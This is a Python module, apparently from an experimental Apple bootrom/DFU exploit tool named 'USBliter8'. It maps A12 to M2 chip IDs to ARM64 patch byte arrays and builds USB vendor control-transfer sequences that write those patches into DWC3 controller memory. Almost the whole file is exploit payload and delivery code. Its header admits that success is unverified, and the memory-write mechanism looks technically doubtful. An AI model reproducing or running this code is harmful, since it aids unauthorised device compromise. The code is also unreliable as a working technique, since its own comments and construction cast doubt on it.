#!/usr/bin/env python3
"""Experimental USBliter8 DWC3 transfer corpus for A12+ devices.

Transfer completion does not establish exploitation. Callers must verify the
vendor-request interface independently and fail closed when it is absent.
"""

from __future__ import annotations

USBLITER8_VID = 0x05AC
USBLITER8_PID = 0x1227

VENDOR_OUT = 0x40
VENDOR_IN = 0xC0
VENDOR_REQ_SET_ADDR = 0x01
VENDOR_REQ_MEM_READ = 0x02
VENDOR_REQ_MEM_WRITE = 0x03
VENDOR_REQ_EXECUTE = 0x04

SUPPORTED_CPIDS = {
    0x8020,  # T8020 (A12)
    0x8027,  # T8027 (A12X)
    0x8028,  # T8028 (A12Z)
    0x8030,  # T8030 (A13)
    0x8101,  # T8101 (A14)
    0x8103,  # T8103 (M1)
    0x8110,  # T8110 (A15)
    0x8112,  # T8112 (M2)
}

DWC3_FW_V1_PATCH = bytes(
    [
        0x4B,
        0x01,
        0x00,
        0x36,
        0x00,
        0x00,
        0x00,
        0x14,
        0x3F,
        0x00,
        0x00,
        0x14,
        0x08,
        0x1A,
        0x00,
        0x58,
        0xC0,
        0x03,
        0x5F,
        0xD6,
        0x1F,
        0x20,
        0x03,
        0xD5,
    ]
)

DWC3_FW_V2_PATCH = bytes(
    [
        0x00,
        0x00,
        0x80,
        0xD2,
        0x00,
        0x00,
        0x00,
        0x14,
        0x3F,
        0x00,
        0x00,
        0x14,
        0x08,
        0x1A,
        0x00,
        0x58,
        0xC0,
        0x03,
        0x5F,
        0xD6,
        0x1F,
        0x20,
        0x03,
        0xD5,
    ]
)

DWC3_FW_V2_PATCH_EXTENDED = bytes(
    [
        0x00,
        0x00,
        0x80,
        0xD2,
        0x00,
        0x00,
        0x00,
        0x14,
        0x3F,
        0x00,
        0x00,
        0x14,
        0x08,
        0x1A,
        0x00,
        0x58,
        0xC0,
        0x03,
        0x5F,
        0xD6,
        0x1F,
        0x20,
        0x03,
        0xD5,
        0x3B,
        0x00,
        0x00,
        0x14,
    ]
)

DWC3_FW_V2_PATCH_FULL = bytes(
    [
        0x00,
        0x00,
        0x80,
        0xD2,
        0x00,
        0x00,
        0x00,
        0x14,
        0x3F,
        0x00,
        0x00,
        0x14,
        0x08,
        0x1A,
        0x00,
        0x58,
        0xC0,
        0x03,
        0x5F,
        0xD6,
        0x1F,
        0x20,
        0x03,
        0xD5,
        0x3B,
        0x00,
        0x00,
        0x14,
        0x3A,
        0x00,
        0x00,
        0x14,
    ]
)

CPID_PATCH_MAP = {
    0x8020: (6, DWC3_FW_V1_PATCH),
    0x8027: (6, DWC3_FW_V1_PATCH),
    0x8028: (6, DWC3_FW_V1_PATCH),
    0x8030: (6, DWC3_FW_V2_PATCH),
    0x8101: (7, DWC3_FW_V2_PATCH_EXTENDED),
    0x8103: (8, DWC3_FW_V2_PATCH_FULL),
    0x8110: (8, DWC3_FW_V2_PATCH_FULL),
    0x8112: (8, DWC3_FW_V2_PATCH_FULL),
}

DWC3_GSNPSID = 0x0000
DWC3_GDBGFIFOSPACE = 0x0100
DWC3_GDBGLSP = 0x0104

USB_DWC3_MMIO_BASE = 0x860000000


def _build_patch_sequence(patch_data: bytes) -> list[tuple[int, int, int, int, bytes]]:
    """Build an experimental DWC3 debug-write transfer sequence."""
    transfers = []
    num_words = len(patch_data) // 4

    for i in range(num_words):
        word = patch_data[i * 4 : (i + 1) * 4]
        word_val = int.from_bytes(word, "little")

        transfers.append(
            (
                VENDOR_OUT,
                VENDOR_REQ_MEM_WRITE,
                0,
                0,
                (USB_DWC3_MMIO_BASE + DWC3_GDBGFIFOSPACE).to_bytes(8, "little")
                + word_val.to_bytes(4, "little")
                + b"\x01\x00\x00\x00",
            )
        )

    return transfers


def get_exploit_payload_tuples(
    cpid: int,
) -> list[tuple[int, int, int, int, bytes]] | None:
    """Get the experimental USB transfer sequence for the given CPID.

    Returns a list of tuples: (bmRequestType, bRequest, wValue, wIndex, data)
    suitable for usb.core.Device.ctrl_transfer().

    Returns None if CPID is not supported.
    """
    if cpid not in SUPPORTED_CPIDS:
        return None

    patch_words, patch_data = CPID_PATCH_MAP.get(cpid, (6, DWC3_FW_V1_PATCH))

    transfers = []

    transfers.append(
        (
            VENDOR_OUT,
            VENDOR_REQ_SET_ADDR,
            0,
            0,
            (USB_DWC3_MMIO_BASE + DWC3_GSNPSID).to_bytes(8, "little"),
        )
    )

    transfers.append((VENDOR_IN, VENDOR_REQ_MEM_READ, 0, 0, 4))

    transfers.extend(_build_patch_sequence(patch_data))

    return transfers


def is_cpid_supported(cpid: int) -> bool:
    """Check if a CPID is supported by the USBliter8 exploit database."""
    return cpid in SUPPORTED_CPIDS


def get_supported_cpids() -> list[int]:
    """Get list of all supported CPIDs."""
    return sorted(SUPPORTED_CPIDS)


def get_cpid_name(cpid: int) -> str:
    """Get human-readable name for a CPID."""
    names = {
        0x8020: "T8020 (A12)",
        0x8027: "T8027 (A12X)",
        0x8028: "T8028 (A12Z)",
        0x8030: "T8030 (A13)",
        0x8101: "T8101 (A14)",
        0x8103: "T8103 (M1)",
        0x8110: "T8110 (A15)",
        0x8112: "T8112 (M2)",
    }
    return names.get(cpid, f"Unknown (0x{cpid:04x})")
